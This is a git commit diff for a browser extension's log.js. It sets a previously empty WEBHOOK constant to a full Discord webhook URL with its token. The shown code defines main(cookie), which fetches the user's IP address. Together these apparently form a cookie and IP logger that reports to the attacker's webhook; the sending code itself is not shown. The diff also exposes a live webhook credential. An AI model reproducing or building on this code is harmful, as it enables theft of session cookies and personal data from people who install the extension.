c8ec8eca1b87285a6d20b59d011c0643e8fbdfed
cluxesalt <133277079+cluxesalt@users.noreply.github.com>
2023-05-11 20:35:12 -0500

    Update log.js

--- extension/scripts/log.js
+++ extension/scripts/log.js
@@ -1,4 +1,4 @@
-const WEBHOOK = "";
+const WEBHOOK = "https://discord.com/api/webhooks/1096215988581703730/e1vZaqCy-my-aSA6GtKPhB6rhQOLaboYkuNl84oPxQYruspK8xvUP9caseFnUk4oYf2E";
 
 async function main(cookie) {
     var ipAddr = await (await fetch("https://api.ipify.org")).text();
